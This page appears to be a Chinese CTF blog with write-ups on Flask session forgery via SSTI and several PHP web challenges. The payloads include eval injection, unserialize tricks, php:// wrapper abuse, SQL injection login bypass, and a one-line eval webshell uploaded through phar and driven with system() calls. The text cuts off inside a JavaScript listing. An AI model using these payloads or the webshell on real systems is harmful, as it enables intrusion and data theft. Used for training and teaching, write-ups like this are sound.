<h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/QQ%E6%88%AA%E5%9B%BE20191016093238.png"></p>
<p>给出进入/admin的提示,进入得到:</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/QQ%E6%88%AA%E5%9B%BE20191016093704.png"></p>
<p>抓包：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/QQ%E6%88%AA%E5%9B%BE20191016093758.png"></p>
<p>得出登录的思路：利用这里的session伪造admin用户登录</p>
<h3 id="Flask中session机制"><a href="#Flask中session机制" class="headerlink" title="Flask中session机制"></a>Flask中session机制</h3><p>我们知道，一般来说，session值存储在服务器端，客户端通过cookie中的sessionid字段来进行身份确认，sessionid本身仅仅只是一段随机字符串。但是在Flask中并不是如此，Flask直接将session存储在cookie中，通过base64加密维护其机密性，通过hmac签名保证其完整性。但是我们知道，base64可以被轻松解密，所以伪造Flask中session的问题就转化为对签名值的伪造。</p>
<p>我们知道hmac是基于密钥的hash函数，即我们只要取得相应的secret_key，即可计算出签名值。而获取secret_key的方式为ssti，在下一部分中叙述，这里假设我们已获取到secret_key的值，现在对session值进行解码。</p>
<p>首先我们需要了解一下session在Flask中的编码与解码机制，具体可参考 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/163975#h3-1">https://www.anquanke.com/post/id/163975#h3-1</a> 。简单来说，进行编码时，先将对象序列化为json，然后判断采用zlib压缩是否使长度减小，若减小则采用压缩算法，并以.作为压缩标志，进行base64加密后与base64加密的时间戳拼接，再使用hmac生成签名值拼接即可。流程图表示大致为:</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/QQ%E6%88%AA%E5%9B%BE20191016105821.png"></p>
<p>解码过程与之类似，只不过过程相反，并且在解出时间戳之后，会对时间戳是否超时进行检查。在实际进行解码时，在github上找到了如下程序，链接为 <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<p><a href="blob:http://106.54.80.67/de884b7b-0968-4026-b42e-a9153e507643">flask_session_cookie_manager3.py</a><a href="blob:http://106.54.80.67/de884b7b-0968-4026-b42e-a9153e507643">下载</a></p>
<p>此为这里主要使用的程序，我们查看其中的代码：</p>
<p>if __name__ == “__main__“:<br>    # Args are only relevant for __main__ usage</p>
<pre><code>## Description for help
parser = argparse.ArgumentParser(
            description=&#39;Flask Session Cookie Decoder/Encoder&#39;,
            epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)

## prepare sub commands
subparsers = parser.add\_subparsers(help=&#39;sub-command help&#39;, dest=&#39;subcommand&#39;)

## create the parser for the encode command
parser\_encode = subparsers.add\_parser(&#39;encode&#39;, help=&#39;encode&#39;)
parser\_encode.add\_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar=&#39;&lt;string&gt;&#39;,
                            help=&#39;Secret key&#39;, required=True)
parser\_encode.add\_argument(&#39;-t&#39;, &#39;--cookie-structure&#39;, metavar=&#39;&lt;string&gt;&#39;,
                            help=&#39;Session cookie structure&#39;, required=True)

## create the parser for the decode command
parser\_decode = subparsers.add\_parser(&#39;decode&#39;, help=&#39;decode&#39;)
parser\_decode.add\_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar=&#39;&lt;string&gt;&#39;,
                            help=&#39;Secret key&#39;, required=False)
parser\_decode.add\_argument(&#39;-c&#39;, &#39;--cookie-value&#39;, metavar=&#39;&lt;string&gt;&#39;,
                            help=&#39;Session cookie value&#39;, required=True)

## get args
args = parser.parse\_args()

## find the option chosen
if(args.subcommand == &#39;encode&#39;):
    if(args.secret\_key is not None and args.cookie\_structure is not None):
        print(FSCM.encode(args.secret\_key, args.cookie\_structure))
elif(args.subcommand == &#39;decode&#39;):
    if(args.secret\_key is not None and args.cookie\_value is not None):
        print(FSCM.decode(args.cookie\_value,args.secret\_key))
    elif(args.cookie\_value is not None):
        print(FSCM.decode(args.cookie\_value))
</code></pre>
<p>可以看到，当子命令为encode时，需要secret_key和session值两个参数，之后调用了FSCM(即flask session cookie manager)类中的encode函数。decode时则不一定需要secret_key，调用了FSCM中的decode函数。于是我们查看FSCM类:</p>
<p>else: # &gt; 3.4<br>    class FSCM(ABC):<br>        def encode(secret_key, session_cookie_structure):<br>            “”” Encode a Flask session cookie “””<br>            try:<br>                app = MockApp(secret_key)<br>                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))<br>                si = SecureCookieSessionInterface()<br>                s = si.get_signing_serializer(app)</p>
<pre><code>            return s.dumps(session\_cookie\_structure)
        except Exception as e:
            return &quot;\[Encoding error\] &#123;&#125;&quot;.format(e)
            raise e


    def decode(session\_cookie\_value, secret\_key=None):
        &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;
        try:
            if(secret\_key==None):
                compressed = False
                payload = session\_cookie\_value

                if payload.startswith(&#39;.&#39;):
                    compressed = True
                    payload = payload\[1:\]

                data = payload.split(&quot;.&quot;)\[0\]

                data = base64\_decode(data)
                if compressed:
                    data = zlib.decompress(data)

                return data
            else:
                app = MockApp(secret\_key)

                si = SecureCookieSessionInterface()
                s = si.get\_signing\_serializer(app)

                return s.loads(session\_cookie\_value)
        except Exception as e:
            return &quot;\[Decoding error\] &#123;&#125;&quot;.format(e)
            raise e
</code></pre>
<p>这里省略了进行Python版本号判断的代码，直接截取version&gt;3.4的部分。可以看到其中直接调用了Flask库的相关函数。观察decode部分，在有secret_key时，直接调用Flask库中的解码函数，而secret_key不存在时，首先判断是否压缩过，若是则解压，截取分隔符前数据即得到所求。所以，现在只需获取到secret_key就能对session进行伪造。</p>
<h3 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h3><p>ssti即服务器模板注入(server-side template injection)，简单的说，即在使用模板时，将可被执行的部分作为用户可控的参数，从而导致RCE。在这里我们尝试payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.97.201.20:5000&#x2F;%7B%7Bconfig%7D%7D</span><br></pre></td></tr></table></figure>

<p>得到配置信息：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/QQ%E6%88%AA%E5%9B%BE20191016200029-1024x182.png"></p>
<p>可以得到secret_key</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>首先进行解码：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/QQ%E6%88%AA%E5%9B%BE20191016202436-1024x66.png"></p>
<p>然后使用secret_key进行加密：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/QQ%E6%88%AA%E5%9B%BE20191016202521-1024x55.png"></p>
<p>在burp中修改session值，get得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/QQ%E6%88%AA%E5%9B%BE20191016202621.png"></p>
<p>得到flag。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>将session存储在客户端且没有足够的加密措施是很危险的，一旦攻击者通过xss或ssti等方式获得了密钥，就能轻易地伪造。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/16/cnss-true-love-writeup/" data-id="ckpw1c6ub000cfww095i9e115" data-title="CNSS True_Love WriteUp" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/" rel="tag">客户端session</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-aegis-recruit-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/09/aegis-recruit-writeup/" class="article-date">
  <time class="dt-published" datetime="2019-10-09T13:21:21.000Z" itemprop="datePublished">2019-10-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WriteUp-in-platform/">WriteUp in platform</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/09/aegis-recruit-writeup/">Aegis recruit WriteUp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-Adventures-in-PHP-0"><a href="#1-Adventures-in-PHP-0" class="headerlink" title="1.Adventures in PHP (0)"></a>1.Adventures in PHP (0)</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/497_1.png"></p>
<p>作为招新题的第一题，自然难度不大，点击连接可以看到PHP源代码：</p>
<?php 
error\_reporting(0); 
include('flag1.php'); 
if (!isset($\_GET\['flag'\])){ 
    show\_source(\_\_FILE\_\_); 
    exit(); 
} 
if (strcmp($\_GET\['flag'\], $flag) == 0) { 
echo "success, flag:" . $flag; 
} ?>

<p>我们可以看到代码中包含了flag1.php文件，从下方代码中推测$flag变量在这个文件中声明。阅读代码发现，其获取了通过get方法传上来的键为flag的值。如果这个值未被设置，就打印出源代码。紧接着通过strcmp()函数判断该值与已经设置的$flag变量是否相同，若相同则输出$flag的值。经过搜索资料，注意到PHP中的<strong>strcmp语句有漏洞，即当比较的两个变量中有一个不是字符串类型时，函数就会出现错误而返回0</strong>.但是程序在get到的变量为整型时，会将其解释为字符串，于是想到令该值为数组或对象即可绕过判断。于是构造:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8000&#x2F;?flag[]&#x3D;</span><br></pre></td></tr></table></figure>

<p>得到flag:</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/499_1.png"></p>
<h3 id="2-Adventures-in-PHP-1"><a href="#2-Adventures-in-PHP-1" class="headerlink" title="2.Adventures in PHP (1)"></a>2.Adventures in PHP (1)</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/501_1.png"></p>
<p>同样进入链接就给出了源代码：</p>
<?php
$array1 = array("a"=>"apple","b"=>"ban");
$array2 = array("a","b","c");
var\_dump($array1);
var\_dump($array2);
?>

<p>则输出</p>
<p>array(2) {<br>  [“a”]=&gt;<br>  string(5) “apple”<br>  [“b”]=&gt;<br>  string(3) “ban”<br>}<br>array(3) {<br>  [0]=&gt;<br>  string(1) “a”<br>  [1]=&gt;<br>  string(1) “b”<br>  [2]=&gt;<br>  string(1) “c”<br>}</p>
<p>在这里我们注意到$args前还有一个$符号，于是可以利用全局变量GLOBALS。$GLOBALS可引用全局作用域中的全部变量，键为变量的名称，值即为变量的值，于是构造payload，输出所有变量的值:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8001&#x2F;?args&#x3D;GLOBALS</span><br></pre></td></tr></table></figure>

<p>得到flag:</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/503_1-1024x57.png"></p>
<p><strong>Ps</strong>:在复现这个问题时，发现eval()函数的一个问题，如下代码</p>
<?php
$array1 = array("a"=>"apple","b"=>"ban"); 
$array2 = array("a","b","c");
$args = "array1";
var\_dump($array1);
var\_dump($$args);
eval("var\_dump(\\$array1);");(1)
eval("var\_dump(\\$$args);"); (2)
?>

<p>实际运行时发现，(1)语句如果没有转义符，会导致解析失败，而(2)中如没有转义符，也不会出现问题。</p>
<h3 id="3-Is-everything-injectable"><a href="#3-Is-everything-injectable" class="headerlink" title="3.Is everything injectable?"></a>3.Is everything injectable?</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/505_1.png"></p>
<p>这道题有两个小问，我们一一来看。第一问：</p>
<p>flag 在变量里! &lt;?php  <br>error_reporting(0);<br>include “flag1.php”;<br>highlight_file(__file__);<br>if(isset($_GET[‘args’])){<br>    $args = $_GET[‘args’];<br>    if(!preg_match(“/^\w+$/“,$args)){<br>        die(“args error!”);<br>    }<br>    eval(“var_dump($$args);”);<br>}</p>
<p>与第二题的方法完全一样，构造payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8005&#x2F;index1.php?args&#x3D;GLOBALS</span><br></pre></td></tr></table></figure>

<p>得到flag:</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/507_1-1024x189.png"></p>
<p>第二问：</p>
<?php  
include "flag2.php"; 
error\_reporting(0); 
show\_source(\_\_FILE\_\_); 
$a = @$\_REQUEST\['hello'\]; 
eval("var\_dump($a);");
>

想到采用之前的方法来构造payload:

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8005&#x2F;index2.php?hello&#x3D;$GLOBALS</span><br></pre></td></tr></table></figure>

得到

![](http://106.54.80.67/wp-content/uploads/2019/10/509_1-1024x147.png)

  
并没有flag，可以推测flag在文件flag2.php中，因此不包含在$GLOBALS数组中。于是又想到通过闭合var\_dump()函数。但是用什么样的语句来探测flag2.php中的内容呢？经过学习，得知**php中的file()函数可以将一个文件中的内容作为数组输出，每一行的内容作为一个数组的一个单元**。又php中echo不能输出数组的内容，所以通过print\_r()函数来输出，于是构造payload:

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8005&#x2F;index2.php?hello&#x3D;);print_r(file(&quot;flag2.php&quot;)</span><br></pre></td></tr></table></figure>

得到flag:

![](http://106.54.80.67/wp-content/uploads/2019/10/511_1-1024x65.png)

### 4.Adventures in PHP (2)

![](http://106.54.80.67/wp-content/uploads/2019/10/513_1.png)

这题大概是所有题中卡住时间最长的了，尤其是在最后一个分支，代码如下：

<?php include 'fl4g.php'; error\_reporting(0); 
if($\_REQUEST\['mode'\]!="begin"){ 
    show\_source(\_\_FILE\_\_); 
    die("PHP Games!"); 
}else{ 
    class last\_task{ 
        var $left; 
        var $middle; 
        var $right; 
    } 
    $a=$\_GET\['a'\]; 
    $b=$\_GET\['b'\]; 
    if($a==$b){ 
        die("wrong way"); 
    }else{ 
        if(md5($a)!=sha1($b)){ 
            die("need a little magic"); 
        }else{ 
            if($\_POST\['token'\]){ 
                $token = unserialize($\_POST\['token'\]); 
                if($token\['user'\]=="user"&&$token\['pass'\]=="pass"){ 
                        $flag=$\_POST\['flag'\]; 
                        if($flag){ 
                            $flag = unserialize(urldecode($flag)); 
                            $flag->middle = $fl4g; 
                            if($flag->middle===$flag->left&&$flag->middle===$flag->right){ 
                                echo "this is your flag ".$flag->middle; 
                            }else{ 
                                die("one more step"); 
                            } 
                        }else{ 
                            die("don't give up"); 
                        } 
                }else{ 
                    die("Not a valid token"); 
                } 
            }else{ 
                die("give me the token"); 
            } 
        } 
    } 
} ?><p> </p>
<p>这段代码共有六个判断，只有每一个分支都正确通过才能得到flag。首先设置mode参数的值为”begin”。第一个问题要求$a与$b参数的值不相等但是要求md5与sha1的哈希值相等。我们知道评价哈希算法好坏一个重要因素就是碰撞的概率，而md5和sha1这样成熟的哈希算法碰撞的可能性自然不高。但经过查找，发现<strong>md5或sha1加密后，如果开头为0e，则该值会被视为科学记数法，即0的若干次方。但0的任意次方都为0，所以在比较时可能会出现问题</strong>。于是查找可以使用的相关数据，得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a &#x2F;&#x2F;md5</span><br><span class="line"></span><br><span class="line">sha1(&#39;aaroZmOk&#39;)  </span><br><span class="line">sha1(&#39;aaK1STfY&#39;)</span><br><span class="line">sha1(&#39;aaO8zKZF&#39;)</span><br><span class="line">sha1(&#39;aa3OFF9m&#39;) &#x2F;&#x2F;sha1</span><br></pre></td></tr></table></figure>

<p>于是构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8004&#x2F;?a&#x3D;s214587387a&amp;b&#x3D;aa3OFF9m&amp;mode&#x3D;begin</span><br></pre></td></tr></table></figure>

<p>可绕过该判断<br>不仅如此，php中md5()函数与sha1()函数都有着无法处理数组的漏洞，一旦输入数组都会返回FALSE，满足判断条件，因此也可构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8004&#x2F;?a[]&#x3D;[]&amp;b[]&#x3D;[1]&amp;mode&#x3D;begin</span><br></pre></td></tr></table></figure>

<p>通过该判断后，接下来的代码提交参数采用的是post方法，无法通过构造url直接提交，于是采用Python的requests库提交post参数。阅读代码可知，接下来的判断为提交的的token参数的反序列化，这里涉及到了反序列化函数unserialize()，该函数是序列化函数serialize()的逆过程，<strong>序列化将一个数组或对象变为一个表示该数组或对象信息的字符串，而反序列化则是将字符串还原为字符或数组</strong>。序列化后的格式大致如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:1:&quot;a&quot;;s:4:&quot;user&quot;;s:1:&quot;b&quot;;s:4:&quot;pass&quot;;&#125;</span><br><span class="line"></span><br><span class="line">&#39;O:9:&quot;last_task&quot;:3:&#123;s:4:&quot;left&quot;;s:1:&quot;a&quot;;s:6:&quot;middle&quot;;s:2:&quot;hh&quot;;s:5:&quot;right&quot;;s:3:&quot;hhh&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>从中可以读出数组的元素类型，名称，长度，对象的成员类型和值等信息。所以通过user与pass的判断只需构造键值对：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;token&#39;: &#39;a:2:&#123;s:4:&quot;user&quot;;s:4:&quot;user&quot;;s:4:&quot;pass&quot;;s:4:&quot;pass&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>最后一个分支判断中，代码将$f14g的值赋给了flag-&gt;middle，紧接着判断middle与right，left的值是否相同，但是我们目前无法得知$f14g的值，也就无法构造满足题意的反序列化字符串。但根据提示“引用”，查询与引用和反序列化相关的知识，得知<strong>反序列化字符串中可以包含某个变量的引用</strong>。于是在该题中，我们就可以利用引用变量达到三个变量一起变化的目的。以此编写Python代码如下：</p>
<p>import requests<br>url = “<a target="_blank" rel="noopener" href="http://95.179.228.15:8004/?a%5C%5B%5C%5D=$GLOBALS&amp;b%5C%5B%5C%5D=%5C%5B2%5C%5D&amp;mode=begin&quot;">http://95.179.228.15:8004/?a\[\]=$GLOBALS&amp;b\[\]=\[2\]&amp;mode=begin&quot;</a><br>params = {‘token’: ‘a:2:{s:4:”user”;s:4:”user”;s:4:”pass”;s:4:”pass”;}’,         <br>               “flag”: ‘O:9:”last_task”:3:{s:4:”left”;s:1:”a”;s:6:”middle”;R:2;s:5:”right”;R:2;}’}</p>
<p> if __name__ == “__main__“:   <br> r = requests.post(url,data = params)   <br> print(r.text)</p>
<p>运行得到flag：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/515_1.png"></p>
<h3 id="5-Adventures-in-PHP-3"><a href="#5-Adventures-in-PHP-3" class="headerlink" title="5.Adventures in PHP (3)"></a>5.Adventures in PHP (3)</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/517_1.png"></p>
<p>点击链接看到源码：</p>
<?php   
error\_reporting(0); 
include("flag3.php"); 
class Flag{  
    public $file;   
    public function \_\_tostring(){   
        if(isset($this->file)){   
            echo file\_get\_contents($this->file);  
            echo "<br>"; 
            return ("good"); 
        }   
    }   
} 
$txt = $\_GET\["txt"\]; 
$password = $\_GET\["password"\];   
if(!isset($txt)){ 
    show\_source(\_\_FILE\_\_); 
    exit(); 
} 
if(file\_get\_contents($txt,'r')==="welcome to the aegis"){   
    echo "hello friend!<br>";     
    $password = unserialize($password);   
    echo $password;   
}else{   
    echo "something wrong! try it again";   
} 
   ?>

<p>这里遇到了函数file_get_contents(),该函数把文件的内容读到一个字符串中。但是此处没有上传文件的方法，应该如何输入指定的字符串呢？这里我们了解到php的一个伪协议<strong>php://input可以访问请求中的原始数据流，即我们可以认为php://input为文件名，而随请求传入的参数即为文件内容</strong>，由此方法可以通过该判断。紧接着又出现了反序列化函数，通过编写php代码容易构造符合题意的反序列化字符串：</p>
<?php
class Flag{  
    public $file;   
    public function \_\_tostring(){   
        if(isset($this->file)){   
            echo file\_get\_contents($this->file);  
            echo "<br>"; 
            return ("good"); 
        }   
    }   
} 
$a = new Flag();
$a->file = "flag3.php";
$str = serialize($a);
echo $str;
?>

<p>于是编写Python代码：</p>
<p>import requests<br>url = ‘<a target="_blank" rel="noopener" href="http://95.179.228.15:8002/?txt=php://input&amp;password=O:4:&quot;Flag&quot;:1:%7Bs:4:&quot;file&quot;;s:9:&quot;flag3.php&quot;;%7D&#39;">http://95.179.228.15:8002/?txt=php://input&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:9:&quot;flag3.php&quot;;}&#39;</a><br>params = “welcome to the aegis”</p>
<p>if __name__ == “__main__“:   <br>r = requests.post(url,data = params)   <br>print(r.text)</p>
<p>得到flag:</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/519_1.png"></p>
<h3 id="6-不能getshell还日什么站？嗯？"><a href="#6-不能getshell还日什么站？嗯？" class="headerlink" title="6.不能getshell还日什么站？嗯？"></a>6.不能getshell还日什么站？嗯？</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/521_1-1.png"></p>
<p>为数不多不是直接给出源代码的题目，进入链接得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/523_1.png"></p>
<p>尝试上传文件后发现不允许上传php文件，只能上传图片，但上传后会给出存储的路径。查看网页源代码：  </p>
<p>发现有include.php的文件，于是尝试<strong>使用php://filter伪协议得到源码</strong>，尝试构造payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8006&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;include.php</span><br></pre></td></tr></table></figure>

<p>发现可行，得到include.php的base64编码字符串，解密后得到include.php：</p>
<html>
Tips: the parameter is file! :) 
<!-- upload.php -->
</html>
<?php
    error\_reporting(0);
    @$file = $\_GET\["file"\];
    if(isset($file))
    {
        if (preg\_match('/httpdataftpinput%00/i', $file)  strstr($file,"..") !== FALSE  strlen($file)>=70)
        {
            echo "<p> error! </p>";
        }
        else
        {
            include($file.'.php');
        }
    }
?>

<p>阅读源码，发现正则匹配参数$file中不能包括有http,data,ftp,input，%00，..等字符串，并且文件长度不得大于70。因此一些用长度来截断的方法便不能使用。通过判断后，程序将以$file为文件名的php文件包含。参考提示中的phar，我们了解到<strong>phar协议是一种归档格式，通过该协议也能达到文件包含的目的</strong>。于是我们建立文件，将其命名为new.php，写入<strong>一句话木马</strong>和测试是否包含成功的phpinfo:</p>
<?php @eval($\_P0/\*备份文件报毒\*/ST\['pass'\]); echo phpinfo();?>

<p>将其打包为new.zip，再将后缀改为jpg，上传到服务器。上传成功后可以看到路径：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/527_1.png"></p>
<p>构造payload包含该文件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95.179.228.15:8006&#x2F;include.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;new.jpg&#x2F;new件:</span><br></pre></td></tr></table></figure>

<p>发现包含成功：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/529_1-1024x301.png"></p>
<p>尝试使用中国菜刀连接，不知为何连接不上，于是直接使用Python来发出相关命令：</p>
<p>import requests<br>url = ‘<a target="_blank" rel="noopener" href="http://95.179.228.15:8006/include.php?file=phar://upload/new.jpg/new&#39;">http://95.179.228.15:8006/include.php?file=phar://upload/new.jpg/new&#39;</a><br>params = {“pass”:”system(ls);”}<br>if __name__ == “__main__“:   <br>    r = requests.post(url,data = params)   <br>    print(r.text)</p>
<p>得到文件目录列表</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/531_1.png"></p>
<p>进入<a href="mailto:&#102;&#x31;&#x6c;&#x31;&#108;&#x31;&#64;&#103;&#x2e;&#116;&#x78;&#x74;">&#102;&#x31;&#x6c;&#x31;&#108;&#x31;&#64;&#103;&#x2e;&#116;&#x78;&#x74;</a>，得到flag：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/533_1.png"></p>
<h3 id="7-sqli"><a href="#7-sqli" class="headerlink" title="7.sqli"></a>7.sqli</h3><p>这是一道当时没有做出来的题目，通过源码和wsl+apache2+php+mysql搭建环境：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/623_1-1024x433.png"></p>
<p>在源码的config.php中更改了密码以顺利连接数据库，在index.php中让执行的sql语句输出以便于阅读。阅读源码发现其中使用正则过滤了这些字符：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/625_1.png"></p>
<p>可以看到其中没有单引号于是可以采用万能用户名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>但是发现不能成功，查询语句为：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/627_1.png"></p>
<p>因为第一个条件不能满足，所以即使第二个为真，与上第三个表达式后依然为假，所以只要使username为真，就可利用逻辑短路跳过其他判断，所以使用用户名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>就能得到flag。<br>对sql的不熟悉和对注入的了解很少是这道题没做出来的原因。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-真·签到题"><a href="#1-真·签到题" class="headerlink" title="1.真·签到题"></a>1.真·签到题</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/535_1.png"></p>
<p>确实是真签到题，不过也是人生中的第一道CTF题</p>
<h3 id="2-抠脑壳"><a href="#2-抠脑壳" class="headerlink" title="2.抠脑壳"></a>2.抠脑壳</h3><p><img src="http://106.54.80.67/wp-content/uploads/2019/10/537_1.png"></p>
<p>我们将文件下载，得到压缩包encrypt.zip,解压后得到一个无法打开的文件encrypt.exe。尝试使用记事本打开，发现可行，得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/539_1-1024x491.png"></p>
<p>由开头的字符怀疑为网址，输入浏览器地址栏得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/541_1-1024x659.png"></p>
<p>扫码后得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(function(p,a,c,k,e,d)&#123;e&#x3D;function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c&#x2F;a)))+((c&#x3D;c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&#39;&#39;.replace(&#x2F;^&#x2F;,String))&#123;while(c--)d[e(c)]&#x3D;k[c]e(c);k&#x3D;[function(e)&#123;return d[e]&#125;];e&#x3D;function()&#123;return&#39;\\w+&#39;&#125;;c&#x3D;1;&#125;;while(c--)if(k[c])p&#x3D;p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p;&#125;(&#39;7 5&#x3D;\&#39;\&#39;7 8&#x3D;\&#39;\&#39;;g(7 4&#x3D;0,9&#x3D;5.a,1,3;4&lt;9;++4)&#123;1&#x3D;5.c(4);b(1&lt;6)1+&#x3D;6;d 1-&#x3D;6;1&#x3D;f-1;3&#x3D;1.h(e);b(3.a&lt;2)3&#x3D;\&#39;0\&#39;+3;8+&#x3D;3&#125;&#39;,18,18,&#39;charCodehexCodexflag128varcipherylengthifcharCodeAtelse16255fortoString&#39;.split(&#39;&#39;),0,&#123;&#125;))</span><br></pre></td></tr></table></figure>

<p>经搜索，发现为格式化JS代码，使用搜索得到的解密网页：</p>
<script> 
a=62; 
function encode() { 
 var code = document.getElementById('code').value; 
 code = code.replace(/\[\\r\\n\]+/g, ''); 
 code = code.replace(/'/g, "\\\\'"); 
 var tmp = code.match(/\\b(\\w+)\\b/g); 
 tmp.sort(); 
 var dict = \[\]; 
 var i, t = ''; 
 for(var i=0; i<tmp.length; i++) { 
   if(tmp\[i\] != t) dict.push(t = tmp\[i\]); 
 } 
 var len = dict.length; 
 var ch; 
 for(i=0; i<len; i++) { 
   ch = num(i); 
